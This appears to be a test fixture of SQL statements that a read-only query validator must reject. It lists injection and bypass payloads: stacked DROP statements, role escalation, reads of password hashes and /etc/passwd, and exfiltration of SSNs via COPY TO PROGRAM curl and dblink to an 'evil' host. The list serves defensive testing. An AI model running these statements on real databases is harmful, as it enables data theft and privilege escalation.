-- Statements that check() must reject. Split on a line that is exactly '-- next' minus the quotes.
-- Each is either not a single read-only SELECT, names a relation off the allow-list,
-- calls a blocked or unknown function, or fails to parse. None should reach the database.

INSERT INTO core.claims (claim_id) VALUES (1)
-- next
UPDATE core.claims SET reserve = 0
-- next
DELETE FROM core.payments
-- next
MERGE INTO core.claims c USING core.claims s ON c.claim_id = s.claim_id WHEN MATCHED THEN DELETE
-- next
CREATE TABLE public.scratch (x int)
-- next
DROP TABLE core.claims
-- next
ALTER TABLE core.claims DISABLE ROW LEVEL SECURITY
-- next
TRUNCATE core.payments
-- next
GRANT SELECT ON core.policyholders TO PUBLIC
-- next
SELECT 1; DROP TABLE core.claims
-- next
SELECT 1 FROM sem.v_claims; UPDATE core.claims SET reserve = 0
-- next
SET ROLE chat_supervisor
-- next
SET SESSION AUTHORIZATION u_supervisor
-- next
SELECT set_config('role', 'u_supervisor', false)
-- next
SELECT set_config('statement_timeout', '0', false)
-- next
SELECT current_setting('is_superuser')
-- next
SELECT pg_sleep(10)
-- next
SELECT * FROM pg_sleep(10)
-- next
SELECT pg_sleep_for('10 seconds')
-- next
SELECT rolname, rolpassword FROM pg_catalog.pg_authid
-- next
SELECT * FROM pg_roles
-- next
SELECT usename, passwd FROM pg_shadow
-- next
SELECT table_name FROM information_schema.tables
-- next
SELECT schemaname FROM pg_catalog.pg_tables
-- next
WITH v_claims AS (SELECT * FROM pg_roles) SELECT * FROM v_claims
-- next
WITH "sem.v_claims" AS (SELECT rolname AS region FROM pg_roles) SELECT * FROM "sem.v_claims"
-- next
WITH v_payments_net AS (SELECT ssn AS amount FROM core.policyholders) SELECT * FROM v_payments_net
-- next
SELECT claim_id INTO scratch FROM sem.v_claims
-- next
COPY (SELECT ssn FROM core.policyholders) TO PROGRAM 'curl http://x/'
-- next
COPY core.policyholders TO STDOUT
-- next
SELECT lo_import('/etc/passwd')
-- next
SELECT lo_export(1, '/tmp/out')
-- next
SELECT dblink('host=evil', 'SELECT ssn FROM core.policyholders')
-- next
SELECT * FROM sem.v_claims FOR UPDATE
-- next
SELECT * FROM sem.v_claims FOR NO KEY UPDATE SKIP LOCKED
-- next
SELECT claim_id::text FROM sem.v_claims UNION SELECT ssn FROM core.policyholders
-- next
SELECT claim_id FROM sem.v_claims WHERE claim_id IN (SELECT claim_id FROM core.claims)
-- next
SELECT (SELECT ssn FROM core.policyholders ORDER BY policyholder_id LIMIT 1) AS x FROM sem.v_claims
-- next
SELECT /* sneak */ ssn FROM core.policyholders -- trailing comment
-- next
SELECT * FROM sem.v_claims /* ok */ WHERE 1 = 1; DROP TABLE core.claims
-- next
SELECT * FROM core.claims WHERE region = 'West'
-- next
ＳＥＬＥＣＴ 1 FROM sem.v_claims
-- next
EXPLAIN ANALYZE SELECT * FROM core.claims
-- next
DO $$ BEGIN PERFORM set_config('role', 'u_supervisor', false); END $$
-- next
CALL some_procedure()
-- next
LISTEN claims_channel
-- next
NOTIFY claims_channel, 'exfil'
-- next
SELECT pg_notify('claims_channel', 'exfil')
-- next
PREPARE steal AS SELECT ssn FROM core.policyholders
-- next
EXECUTE steal
-- next
SELECT pg_advisory_lock(42)
-- next
SELECT pg_advisory_xact_lock(42)
-- next
SELECT pg_logical_emit_message(false, 'prefix', 'payload')
-- next
SELECT txid_current()
-- next
SELECT pg_read_file('/etc/passwd')
-- next
SELECT pg_ls_dir('/')
-- next
SELECT query_to_xml('SELECT ssn FROM core.policyholders', true, false, '')
-- next
SELECT ctid, xmin FROM sem.v_claims
-- next
VALUES (1), (2)
